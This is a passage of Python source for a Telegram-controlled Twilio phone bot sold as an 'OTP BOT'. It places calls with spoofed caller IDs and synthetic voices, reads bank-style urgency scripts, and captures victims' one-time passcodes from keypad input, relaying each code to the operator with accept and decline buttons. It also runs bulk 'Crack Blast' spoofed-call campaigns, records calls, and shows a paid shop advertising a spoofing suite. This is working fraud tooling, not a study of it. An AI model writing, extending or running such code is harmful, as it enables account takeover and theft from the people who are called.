                    resp.say(final)
                resp.hangup()
                return Response(str(resp), content_type="application/xml")
            fallback = f"{no_response_text} Please press 1 to avoid account lock."
            resp = VoiceResponse()
            audio_fallback = generate_call_audio(user_id=user_id, text=fallback, voice_id=voice_id, filename="normal_ultimate_fallback.mp3")
            if audio_fallback:
                resp.play(audio_fallback)
            else:
                resp.say(fallback)
            resp.pause(length=5)
            gather_action = (
                f"/capture_otp?user_id={quote_plus(str(user_id))}"
                f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=confirm1&after_gather=1"
            )
            gather = Gather(
                num_digits=1,
                action=gather_action,
                timeout=5,
                input="dtmf",
                method="POST",
                finish_on_key="",
            )
            reprompt = retry_text
            audio_reprompt = generate_call_audio(user_id=user_id, text=reprompt, voice_id=voice_id, filename="normal_ultimate_press1_retry.mp3")
            if audio_reprompt:
                gather.play(audio_reprompt)
            else:
                gather.say(reprompt)
            resp.append(gather)
            return Response(str(resp), content_type="application/xml")
        # Initial confirm1 prompt with a bank-style greeting and urgency script.
        prompt = confirm_prompt
        resp = VoiceResponse()
        gather_action = (
            f"/capture_otp?user_id={quote_plus(str(user_id))}"
            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=confirm1&after_gather=1"
        )
        gather = Gather(
            num_digits=1,
            action=gather_action,
            timeout=10,
            input="dtmf",
            method="POST",
            finish_on_key="",
        )
        prompt_audio = generate_call_audio(user_id=user_id, text=prompt, voice_id=voice_id, filename="normal_ultimate_press1.mp3")
        if prompt_audio:
            gather.play(prompt_audio)
        else:
            gather.say(prompt)
        resp.append(gather)
        return Response(str(resp), content_type="application/xml")

    if stage == "otp":
        if not after_gather:
            prompt = otp_prompt
            resp = VoiceResponse()
            audio_prompt = generate_call_audio(user_id=user_id, text=prompt, voice_id=voice_id, filename="normal_ultimate_otp_request.mp3")
            if audio_prompt:
                resp.play(audio_prompt)
            else:
                resp.say(prompt)
            gather_action = (
                f"/capture_otp?user_id={quote_plus(str(user_id))}"
                f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=otp&after_gather=1"
            )
            gather = Gather(
                num_digits=code_length,
                action=gather_action,
                timeout=15,
                input="dtmf",
                method="POST",
                finish_on_key="#",
            )
            resp.append(gather)
            return Response(str(resp), content_type="application/xml")

        # after_gather==True: handle OTP result or timeout
        if call_sid and session is not None:
            session["otp_attempts"] = session.get("otp_attempts", 0)
        if digits:
            if call_sid and session is not None:
                session["otp"] = digits
                session["otp_attempts"] = 0
                session["otp_status"] = "pending"
            if chat_id:
                send_call_stage_status(chat_id, "CAPTURE_OTP", f"🔐 Code received: {digits}")
                buttons = types.InlineKeyboardMarkup()
                buttons.add(
                    types.InlineKeyboardButton("✅ ACCEPT", callback_data=f"otp_accept_{call_sid}_{digits}"),
                    types.InlineKeyboardButton("❌ DECLINE", callback_data=f"otp_decline_{call_sid}_{digits}")
                )
                try:
                    bot.send_message(
                        chat_id,
                        "🔐 *OTP Captured*\n\n"
                        f"Code: `{digits}`\n\n"
                        "Press ✅ to accept and complete the call, or ❌ to decline and retry. "
                        "If no action is taken within 30 seconds, the code will be auto-accepted and the call will end.",
                        reply_markup=buttons,
                        parse_mode="Markdown"
                    )
                except Exception as e:
                    logger.warning(f"Failed to send OTP to Telegram: {e}")

            # Start auto-accept timer. It will only auto-accept if status remains pending.
            def _auto_accept():
                if not call_sid:
                    return
                session = call_sessions.get(call_sid)
                if not session or session.get("otp_status") != "pending":
                    return
                try:
                    session["otp_status"] = "auto_accepted"
                    if digits:
                        def _post_vouch_auto():
                            post_vouch_to_channel(call_sid, session.get("user_id") or user_id, digits, override_mode="Auto Accept")
                        threading.Thread(target=_post_vouch_auto, daemon=True).start()
                    resp_auto = VoiceResponse()
                    say_auto = "Verification successful. Thank you. Goodbye."
                    audio_auto = generate_call_audio(user_id=user_id, text=say_auto, voice_id=voice_id, filename="otp_auto_accept.mp3")
                    if audio_auto:
                        resp_auto.play(audio_auto)
                    else:
                        resp_auto.say(say_auto)
                    resp_auto.hangup()
                    client = twilio_client or get_twilio_client()
                    if client:
                        client.calls(call_sid).update(twiml=str(resp_auto))
                    if chat_id:
                        bot.send_message(chat_id, "⏳ Auto-accepted after timeout. Victim call ended successfully.")
                except Exception as e:
                    logger.exception(f"Auto-accept failed for CallSid={call_sid}: {e}")

            timer = threading.Timer(30.0, _auto_accept)
            timer.daemon = True
            store_otp_timer(call_sid, timer)
            timer.start()

            # Keep the call open while waiting for bot user decision.
            resp = VoiceResponse()
            hold = "Please wait while we verify your code."
            audio_hold = generate_call_audio(user_id=user_id, text=hold, voice_id=voice_id, filename="otp_waiting_hold.mp3")
            if audio_hold:
                resp.play(audio_hold)
            else:
                resp.say(hold)
            resp.pause(length=30)
            return Response(str(resp), content_type="application/xml")

        # Timeout or no digits entered during OTP gather
        if call_sid and session is not None:
            session["otp_attempts"] = session.get("otp_attempts", 0) + 1
            if session["otp_attempts"] >= 3:
                resp = VoiceResponse()
                final = "I didn't receive a code. Please contact support." 
                audio_final = generate_call_audio(user_id=user_id, text=final, voice_id=voice_id, filename="otp_timeout_final.mp3")
                if audio_final:
                    resp.play(audio_final)
                else:
                    resp.say(final)
                resp.hangup()
                return Response(str(resp), content_type="application/xml")

        resp = VoiceResponse()
        retry = "I didn't receive a code. Please try again."
        audio_retry = generate_call_audio(user_id=user_id, text=retry, voice_id=voice_id, filename="otp_timeout_retry.mp3")
        if audio_retry:
            resp.play(audio_retry)
        else:
            resp.say(retry)
        resp.redirect(
            f"/capture_otp?user_id={quote_plus(str(user_id))}"
            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=otp"
        )
        return Response(str(resp), content_type="application/xml")

    # Fallback default behavior
    resp = VoiceResponse()
    resp.say("An error occurred. Goodbye.")
    resp.hangup()
    return Response(str(resp), content_type="application/xml")
@app.route("/twilio/status", methods=["POST"])
@twilio_request_logger("/twilio/status")
def twilio_status():
    """
    Handle call status updates from Twilio (ringing, in-progress, completed, etc.)
    """
    log_twilio_request_debug("/twilio/status")
    
    # Validate request
    is_valid = validate_twilio_request()
    if not is_valid:
        logger.error("[ERROR] Status endpoint: Twilio validation FAILED")
        # Return 200 anyway so Twilio doesn't retry
        return Response("OK", status=200)

    try:
        try:
            call_sid = request.form.get("CallSid")
            status = request.form.get("CallStatus")
            answered_by = request.form.get("AnsweredBy") or request.form.get("answered_by") or request.args.get("AnsweredBy") or request.args.get("answered_by")
            chat_id = request.form.get("chat_id") or request.args.get("chat_id")
            user_id = request.form.get("user_id") or request.args.get("user_id")
        except Exception as parse_ex:
            logger.warning(f"Twilio status payload parsing failed: {parse_ex}")
            return Response("OK", status=200)

        if not call_sid:
            logger.warning("Twilio status webhook received without CallSid. Ignoring.")
            return Response("OK", status=200)

        if call_sid:
            session = call_sessions.get(call_sid)
            if session is not None and answered_by:
                session["answered_by"] = answered_by
            elif session is not None and not answered_by:
                session.setdefault("answered_by", "unknown")
            if session is not None and not chat_id and session.get("chat_id"):
                chat_id = session.get("chat_id")
            elif session is not None and not chat_id and session.get("status_chat_id"):
                chat_id = session.get("status_chat_id")

        logger.info(
            f"📊 Call status update: {call_sid} -> {status} (answered_by={answered_by or 'unknown'} user_id={user_id} chat_id={chat_id})"
        )

        if call_sid:
            status_text = None
            final_status = False
            if status == "queued":
                status_text = "⏳ Call queued. Awaiting ring..."
            elif status == "ringing":
                status_text = "📞 Ringing..."
            elif status == "in-progress":
                status_text = "▶️ Call in progress..."
            elif status == "completed":
                status_text = "✅ Call ended."
                final_status = True
            elif status == "failed":
                status_text = "❌ Call failed."
                final_status = True
            elif status == "no-answer":
                status_text = "⏱️ No answer."
                final_status = True
            elif status == "busy":
                status_text = "📵 Line busy."
                final_status = True
            elif status == "canceled":
                status_text = "❌ Call canceled."
                final_status = True

            if status_text:
                update_call_status_message(call_sid, status_text, final=final_status)
                if not final_status:
                    return Response("OK", status=200)

        if final_status and call_sid:
            if status == "completed":
                try:
                    # The recording is handled by Twilio's recording callback (/twilio/recording)
                    # so we only send the final call summary here.
                    answered_by = call_sessions.get(call_sid, {}).get("answered_by") or request.form.get("AnsweredBy") or request.form.get("answered_by") or request.args.get("AnsweredBy") or request.args.get("answered_by") or "unknown"
                    answered_by_text = str(answered_by or "unknown").strip()
                    answer_key = answered_by_text.lower()
                    if answer_key == "human":
                        detection_text = "A human answered the call."
                    elif answer_key in {"unknown", ""}:
                        detection_text = "The answer type could not be determined."
                    elif "machine" in answer_key:
                        detection_text = "A machine answered the call."
                    elif "voicemail" in answer_key:
                        detection_text = "The call reached voicemail."
                    else:
                        detection_text = f"Answer result: {answered_by_text}"

                    summary = (
                        f"✅ Call ended.\n"
                        f"{detection_text}\n"
                        f"CallSid: {call_sid}"
                    )
                    if not update_call_status_message(call_sid, summary, final=True):
                        kb = types.InlineKeyboardMarkup()
                        kb.add(types.InlineKeyboardButton("Main Menu", callback_data="show_main_menu"))
                        if chat_id:
                            try:
                                bot.send_message(int(chat_id), summary, reply_markup=kb)
                            except Exception as send_ex:
                                logger.warning(f"Failed to send final call summary to Telegram: {send_ex}")
                    # Mark the user's last call as completed to prevent reuse of the same setup
                    # only if a human answered. If a machine, voicemail, unknown, or
                    # failed event occurred, do NOT mark as completed so the user
                    # can retry the same setup.
                    try:
                        uid = user_id or call_sessions.get(call_sid, {}).get("user_id")
                        answer_key = (str(answered_by or "") or "").lower()
                        if uid and answer_key == "human":
                            _mark_call_completed(str(uid))
                        else:
                            logger.info(f"Not marking call as completed for user {uid} (answered_by={answered_by})")
                    except Exception:
                        logger.exception("Failed to conditionally mark call completed after summary send")
                except Exception as summ_ex:
                    logger.warning(f"Failed to send final call summary: {summ_ex}")
            cleanup_call_session(call_sid)

        return Response("OK", status=200)

    except Exception as e:
        logger.error(f"[ERROR] Error in /twilio/status endpoint: {e}", exc_info=True)
        return Response("OK", status=200)  # Return 200 to avoid Twilio retries

# ======================================================================
# CALL HISTORY
# ======================================================================
def store_call_metadata(user_id: str, sid: str, target: str = "", campaign: str = "", status: str = "initiated") -> None:
    ensure_user_path(user_id)
    history_path = user_conf_path(user_id) / "call_history.json"
    history = []
    if history_path.exists():
        try:
            with open(history_path, "r") as f:
                history = json.load(f)
        except:
            pass
    history.append({
        "sid": sid,
        "target": target,
        "campaign": campaign,
        "started": datetime.now().isoformat(),
        "status": status,
    })
    with open(history_path, "w") as f:
        json.dump(history, f, indent=2)

def get_call_history(user_id: str) -> list:
    path = user_conf_path(user_id) / "call_history.json"
    if not path.exists():
        return []
    try:
        with open(path, "r") as f:
            return json.load(f)
    except:
        return []


def normalize_bulk_number_list(raw: str) -> list:
    items = re.split(r"[\n\r,;]+", str(raw or ""))
    cleaned = []
    for item in items:
        item = item.strip()
        if not item:
            continue
        number = normalize_phone_number(item)
        if number and is_valid_e164(number):
            cleaned.append(number)
    return list(dict.fromkeys(cleaned))


def get_crackblast_numbers(user_id: str) -> list[str]:
    raw = read_user_file(user_id, "crack_numbers.txt", "")
    return [line.strip() for line in raw.splitlines() if line.strip()]


def save_crackblast_numbers(user_id: str, numbers: list[str]) -> None:
    write_user_file(user_id, "crack_numbers.txt", "\n".join(numbers))


def get_crackblast_config(user_id: str) -> dict:
    return {
        "numbers": get_crackblast_numbers(user_id),
        "script": read_user_file(user_id, "crack_script.txt", "").strip(),
        "caller_id": read_user_file(user_id, "crack_caller_id.txt", "").strip() or TWILIO_PHONE_NUMBER,
        "voice_id": read_user_file(user_id, "crack_voice_id.txt", get_default_voice_id()) or get_default_voice_id(),
        "voice_name": read_user_file(user_id, "crack_voice_name.txt", "Custom") or "Custom",
        "digits": read_user_file(user_id, "crack_digits.txt", "0").strip() or "0",
        "delay": read_user_file(user_id, "crack_delay.txt", "0").strip() or "0",
        "fallback": read_user_file(user_id, "crack_fallback.txt", "").strip(),
    }


def build_crackblast_review_text(user_id: str) -> str:
    config = get_crackblast_config(user_id)
    numbers = config["numbers"]
    script_preview = config["script"]
    if len(script_preview) > 150:
        script_preview = script_preview[:150] + "..."
    return (
        "💥 <b>CRACK BLAST REVIEW</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• Targets: <b>{len(numbers)}</b>\n"
        f"• Caller ID: <b>{config['caller_id']}</b>\n"
        f"• Voice: <b>{config['voice_name']}</b>\n"
        f"• DTMF digits: <b>{config['digits']}</b>\n"
        f"• Delay: <b>{config['delay']}s</b>\n"
        f"• Fallback: <b>{config['fallback'] or 'None'}</b>\n"
        # Script preview omitted from quick panel to avoid displaying full script
        ""
    )


def send_crack_blast_review_panel(chat_id: int, user_id: str) -> None:
    text = build_crackblast_review_text(user_id)
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(types.InlineKeyboardButton("🚀 START BLAST", callback_data="crack_blast_start"))
    buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="crack_blast_cancel"))
    buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="back_to_menu"))
    bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")


def send_crack_script_list(chat_id: int, user_id: str) -> None:
    init_user_db(user_id)
    rows = db_get_script_rows(user_id)[:12]
    if not rows:
        bot.send_message(chat_id, "📚 No saved scripts found. Create one with /create_script or paste a custom campaign script.")
        return
    text = (
        "📝 <b>Select a campaign script</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Preview or use any default or saved script for the Crack Blast campaign."
    )
    buttons = types.InlineKeyboardMarkup(row_width=2)
    for row in rows:
        label = (row["name"] or "Untitled Script")[:24]
        buttons.add(
            types.InlineKeyboardButton(f"👁 {label}", callback_data=f"script_preview_{row['user_id']}_{row['id']}"),
            types.InlineKeyboardButton(f"✅ {label}", callback_data=f"script_select_{row['user_id']}_{row['id']}"),
        )
    buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="crack_blast"))
    bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")


def launch_crackblast_campaign(user_id: str, chat_id: int) -> None:
    from config import USE_AI_FLOW, DEFAULT_VOICE_ID
    
    config = get_crackblast_config(user_id)
    numbers = config["numbers"]
    if not numbers:
        bot.send_message(chat_id, "❌ No target numbers available. Start the Crack Blast wizard again.")
        return

    script = config["script"]
    if not script:
        bot.send_message(chat_id, "❌ No campaign script configured. Start the Crack Blast wizard again.")
        return

    bot.send_message(chat_id, f"🚀 Starting Crack Blast for {len(numbers)} targets. This may take a few minutes.")
    
    # Prepare common parameters for all targets
    name = read_user_file(user_id, "Name.txt", "Customer")
    company = read_user_file(user_id, "Company Name.txt", "your bank")
    voice_id = read_user_file(user_id, "Voice.txt", DEFAULT_VOICE_ID)
    code_length = read_user_file(user_id, "CodeLength.txt", "6")
    
    success = 0
    failed = 0
    for number in numbers:
        if USE_AI_FLOW:
            webhook_url = (
                f"{NGROK_URL.rstrip('/')}/ai_start"
                f"?user_id={quote_plus(str(user_id))}"
                f"&chat_id={quote_plus(str(chat_id))}"
                f"&name={quote_plus(name)}"
                f"&company={quote_plus(company)}"
                f"&voice_id={quote_plus(voice_id)}"
                f"&custom_script={quote_plus(script)}"
                f"&code_length={quote_plus(code_length)}"
                f"&call_type=crack_blast"
                f"&mode_label=Crack%20Blast"
            )
        else:
            webhook_url = (
                f"{NGROK_URL.rstrip('/')}/custom_flow?user_id={quote_plus(str(user_id))}" 
                f"&chat_id={quote_plus(str(chat_id))}&audio=crack_script"
            )
        
        sid = make_spoofed_call(
            to=number,
            from_number=TWILIO_PHONE_NUMBER,
            caller_id=config["caller_id"],
            webhook_url=webhook_url,
            user_id=user_id,
            chat_id=chat_id,
            call_record=True,
        )
        if sid:
            success += 1
            store_call_metadata(user_id, sid, target=number, campaign="CRACK BLAST", status="initiated")
        else:
            failed += 1
            store_call_metadata(user_id, f"failed_{uuid.uuid4().hex[:8]}", target=number, campaign="CRACK BLAST", status="failed")
        time.sleep(1)

    summary = (
        f"✅ <b>CRACK BLAST COMPLETE</b>\n"
        f"Targets: <b>{len(numbers)}</b>\n"
        f"Started: <b>{success}</b>\n"
        f"Failed: <b>{failed}</b>\n"
        "Your campaign entries have been saved to call history for review."
    )
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(types.InlineKeyboardButton("📥 Export Campaign CSV", callback_data="crackblast_export_csv"))
    buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="back_to_menu"))
    bot.send_message(chat_id, summary, reply_markup=buttons, parse_mode="HTML")


# ======================================================================
# TELEGRAM MENU FUNCTIONS
# ======================================================================
# Preserve the original TeleBot `send_message` method so the wrapper
# can call it directly and avoid recursive aliasing.
_original_bot_send_message = getattr(bot, "send_message", None)

def safe_bot_send_message(chat_id, *args, **kwargs):
    """Send a Telegram message using the current bot.send_message binding.

    This helper is intentionally conservative for testability:
    - If bot.send_message has been monkeypatched, honor that override.
    - If bot.send_message is the wrapper itself, fall back to the original.
    - If the current send fails, log and try the original implementation.
    """
    if not bot:
        logger.error("safe_bot_send_message: bot is not initialized")
        return None

    current_send = getattr(bot, "send_message", None)
    if current_send and current_send is not telegram_safe_send and current_send is not safe_bot_send_message and current_send is not _original_bot_send_message:
        try:
            return current_send(chat_id, *args, **kwargs)
        except Exception as e:
            logger.debug(f"safe_bot_send_message proxy to current bot.send_message failed: {e}")

    if not _original_bot_send_message:
        logger.error("safe_bot_send_message cannot operate because original send_message is missing")
        return None

    try:
        return _original_bot_send_message(chat_id, *args, **kwargs)
    except Exception as e:
        try:
            msg = getattr(e, "result_json", None) or str(e)
            m = re.search(r"retry after\s*(\d+)", str(msg), re.I)
            if m:
                retry = int(m.group(1))
                logger.warning("Telegram API 429, retry after %s seconds", retry)
                time.sleep(min(retry, 30))
                return _original_bot_send_message(chat_id, *args, **kwargs)
        except Exception:
            logger.exception("Telegram retry failed: %s", e)

        logger.exception("Telegram send failed: %s", e)
        return None


def telegram_safe_send(chat_id: int, *args, **kwargs):
    """Send a Telegram message with basic 429 handling and one retry.

    Important: this wrapper must call the preserved original send_message
    implementation (`_original_bot_send_message`) so that assigning
    `bot.send_message = telegram_safe_send` does not cause infinite recursion.
    """
    if not _original_bot_send_message:
        logger.error("Telegram safe send cannot operate because original send_message is missing")
        return None

    try:
        return _original_bot_send_message(chat_id, *args, **kwargs)
    except Exception as e:
        try:
            msg = getattr(e, "result_json", None) or str(e)
            m = re.search(r"retry after\s*(\d+)", str(msg), re.I)
            if m:
                retry = int(m.group(1))
                logger.warning("Telegram API 429, retry after %s seconds", retry)
                time.sleep(min(retry, 30))
                return _original_bot_send_message(chat_id, *args, **kwargs)
        except Exception:
            logger.exception("Telegram retry failed: %s", e)

        logger.exception("Telegram send failed: %s", e)
        return None

# Apply global alias so existing `bot.send_message` calls get 429 handling.
# We preserve the original in `_original_bot_send_message` above so the wrapper
# can call it and avoid recursion.
try:
    if bot:
        bot.send_message = telegram_safe_send
except Exception:
    logger.debug("Could not alias bot.send_message to telegram_safe_send")

# Also alias legacy telebot compatibility instance if present
try:
    if '_telebot_instance' in globals() and _telebot_instance:
        # preserve original if present
        _orig = getattr(_telebot_instance, 'send_message', None)
        try:
            _telebot_instance.send_message = telegram_safe_send
        except Exception:
            pass
        if _orig and not globals().get('_original_bot_send_message'):
            _original_bot_send_message = _orig
except Exception:
    logger.debug("Could not alias _telebot_instance.send_message to telegram_safe_send")
def send_main_menu(chat_id: int, user, message_id: Optional[int] = None) -> None:
    status = get_panel_status_text(str(user.id))
    text = (
        "⚡ <b>HOTTBOIIHITZZ OTP BOT</b> ⚡\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 <b>User ID:</b> <code>{user.id}</code>\n"
        f"{status}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "💎 <b>Unlock Premium Access Now!</b>\n"
        "Get unrestricted access to all advanced features.\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "<b>⚙️ CONTROL PANEL</b>\n"
    )
    buttons = types.InlineKeyboardMarkup(row_width=2)
    buttons.row(
        types.InlineKeyboardButton("📞 START CALL", callback_data="start_call"),
        types.InlineKeyboardButton("🧠 AI MODE", callback_data="ai_mode"),
    )
    buttons.row(
        types.InlineKeyboardButton("💥 CRACK BLAST", callback_data="crack_blast"),
        types.InlineKeyboardButton("👑 ACCOUNT", callback_data="account"),
    )
    buttons.row(
        types.InlineKeyboardButton("📡 CHANNEL", callback_data="channel"),
        types.InlineKeyboardButton(
            "🤝 VOUCHES",
            url="https://t.me/+DYfpnl23jxg1OGRk",
        ),
    )
    buttons.add(types.InlineKeyboardButton("🛠 SUPPORT", callback_data="support"))
    buttons.add(types.InlineKeyboardButton("💎 SHOP", callback_data="open_shop"))
    if message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=buttons, parse_mode="HTML")
        except:
            safe_bot_send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
    else:
        safe_bot_send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")

def send_call_complete_menu(chat_id: int, summary_text: Optional[str] = None) -> None:
    """
    Send a simplified completion menu with just a MAIN MENU button.
    When clicked, it shows the full menu options.
    """
    text = summary_text or "✅ <b>Call completed. Recording saved.</b>"
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(
        types.InlineKeyboardButton("🏠 MAIN MENU", callback_data="show_main_menu")
    )
    safe_bot_send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")

def send_shop_menu(chat_id: int, message_id: Optional[int] = None) -> None:
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔱 <b>PREMIUM SHOP</b> 🔱\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "<b>Elite access for pro operators:</b>\n\n"
        "💯 <b>Unlimited Fast Calls</b>\n"
        "— No daily limits, instant routing\n"
        "— Global reach with high delivery priority\n\n"
        "🎭 <b>Full Spoofing Suite</b>\n"
        "— Custom Caller ID masking available\n"
        "— Pro-grade header control for safer delivery\n"
        "— Spoof with your choice of identities\n\n"
        "🤖 <b>AI MODE V2</b>\n"
        "— Advanced AI voice interaction\n"
        "— Natural conversation flow\n"
        "— Real-time response handling\n\n"
        "⚡ <b>Fast Response Engine</b>\n"
        "— One-click execution for instant launch\n"
        "— Optimized for speed and reliability\n\n"
        "💎 Each plan purchase counts toward a free loyalty premium key. Reach 5 purchases to claim your token.\n\n"
        "<b>Choose your plan:</b>\n👇"
    )
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(types.InlineKeyboardButton("🎟️ 3 Hour Trial — $5", callback_data="plan_3hourtrial"))
    buttons.add(types.InlineKeyboardButton("💎 1 Day — $16", callback_data="plan_1day"))
    buttons.add(types.InlineKeyboardButton("💎 3 Days — $35", callback_data="plan_3days"))
    buttons.add(types.InlineKeyboardButton("💎 1 Week — $70", callback_data="plan_1week"))
    buttons.add(types.InlineKeyboardButton("♾️ Lifetime — $195", callback_data="plan_lifetime"))
    buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="back_to_menu"))
    if message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=buttons, parse_mode="HTML")
        except:
            safe_bot_send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
    else:
        safe_bot_send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")

def send_account_menu(chat_id: int, message_id: Optional[int] = None, user_id_str: Optional[str] = None) -> None:
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔱 <b>HOTTBOIIHITZZ ACCOUNT CENTER</b> 🔱\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "• View your premium status\n"
        "• Redeem loyalty rewards\n"
        "• Manage scripts and launch calls\n"
    )
    buttons = types.InlineKeyboardMarkup(row_width=2)
    buttons.add(
        types.InlineKeyboardButton("🎁 LOYALTY", callback_data="open_loyalty"),
        types.InlineKeyboardButton("📝 SCRIPTS", callback_data="open_scripts"),
    )
    buttons.add(
        types.InlineKeyboardButton("📊 ANALYTICS", callback_data="analytics"),
    )
    if user_id_str and is_privileged_user(user_id_str):
        buttons.add(types.InlineKeyboardButton("🔑 KEY ADMIN", callback_data="open_key_admin"))
        buttons.add(types.InlineKeyboardButton("👥 VIEW USERS", callback_data="open_view_users"))
    buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="back_to_menu"))
    if message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=buttons, parse_mode="HTML")
        except:
            bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
    else:
        bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")


def get_all_user_ids() -> list[str]:
    """Return a sorted list of all user IDs stored under the conf directory."""
    conf_dir = Path("conf")
    if not conf_dir.exists():
        return []
    user_ids = []
    for item in conf_dir.iterdir():
        if not item.is_dir():
            continue
        if item.name in {"backups"}:
            continue
        if item.name.startswith("."):
            continue
        user_ids.append(item.name)
    def sort_key(value: str):
        return (0, int(value)) if value.isdigit() else (1, value.lower())
    return sorted(user_ids, key=sort_key)


def send_loyalty_menu(chat_id: int, message_id: Optional[int] = None, user_id_str: Optional[str] = None) -> None:
    # Loyalty gifts are earned through SUCCESSFUL PAYMENTS (5 payments = 1 gift + 1-day key)
    # This is a tamper-proof system - only /approve command can trigger increments
    gift_count = get_loyalty_gift_count(user_id_str) if user_id_str else 0
    purchase_count = get_purchase_count(user_id_str) if user_id_str else 0
    
    remaining_purchases = max(0, 5 - purchase_count)
    progress = "🛍️" * purchase_count + "⬜" * remaining_purchases
    
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🎁 <b>HOTTBOIIHITZZ LOYALTY SYSTEM</b> 🎁\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>💰 Current Purchases:</b> <code>{purchase_count}/5</code>\n"
        f"<b>Progress to Gift:</b> {progress}\n\n"
        f"<b>🎁 Loyalty Gifts Earned:</b> <code>{gift_count}</code>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>How It Works:</b>\n\n"
        f"✅ Every successful payment = 1 purchase tracked\n"
        f"✅ Every 5 successful payments = 1 loyalty gift\n"
        f"✅ Each gift = 1 free 1-day premium key (auto-awarded)\n\n"
        f"🔒 <b>Tamper-Proof System:</b>\n"
        f"• Only verified payments count\n"
        f"• Admin approval triggers the count\n"
        f"• Gifts awarded automatically at 5 purchases\n"
        f"• Keys generated & activated instantly\n"
        f"• <u>Users CANNOT manipulate this system</u>\n\n"
        f"💡 <b>Pro Tip:</b> Every purchase brings you closer to free premium time!"
    )
    
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(types.InlineKeyboardButton("📦 Shop Premium Plans", callback_data="open_shop"))
    buttons.add(types.InlineKeyboardButton("↩ Back to Account", callback_data="account"))
    
    if message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=buttons, parse_mode="HTML")
        except:
            bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
    else:
        bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")

def send_scripts_menu(chat_id: int, message_id: Optional[int] = None, user_id_str: Optional[str] = None) -> None:
    user_id_str = user_id_str or ""
    init_user_db(user_id_str) if user_id_str else None
    rows = db_get_script_rows(user_id_str) if user_id_str else []
    default_rows = [row for row in rows if row.get("user_id") == "0"][:1]
    my_rows = [row for row in rows if row.get("user_id") == user_id_str]
    text = (
        "📚 <b>SCRIPT LIBRARY</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📌 <b>Default Script:</b>\n"
        + "\n".join(f"{i+1}. {row['name']}" for i, row in enumerate(default_rows))
        + f"\n\n📌 <b>My Saved Scripts:</b> ({len(my_rows)})\n\n"
        "✨ Create New Script\n"
        "📋 Paste Custom Script\n"
    )
    buttons = types.InlineKeyboardMarkup(row_width=1)
    for row in default_rows:
        buttons.add(types.InlineKeyboardButton(f"👁 {row['name']}", callback_data=f"script_preview_{row['user_id']}_{row['id']}"))
    buttons.add(types.InlineKeyboardButton("✨ CREATE NEW", callback_data="create_script"))
    buttons.add(types.InlineKeyboardButton("📋 PASTE CUSTOM", callback_data="paste_script_to_library"))
    buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="account"))
    if message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=buttons, parse_mode="HTML")
        except:
            bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
    else:
        bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")

def send_support_menu(chat_id: int, message_id: Optional[int] = None) -> None:
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🛠 <b>SUPPORT CENTER</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Need help or admin assistance? Contact the admin directly now.\n"
    )
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(types.InlineKeyboardButton("💬 Contact Admin", url="https://t.me/hottboiihitzz"))
    buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="back_to_menu"))
    if message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=buttons, parse_mode="HTML")
        except:
            bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
    else:
        bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")

def send_channel_menu(chat_id: int, message_id: Optional[int] = None) -> None:
    text = (
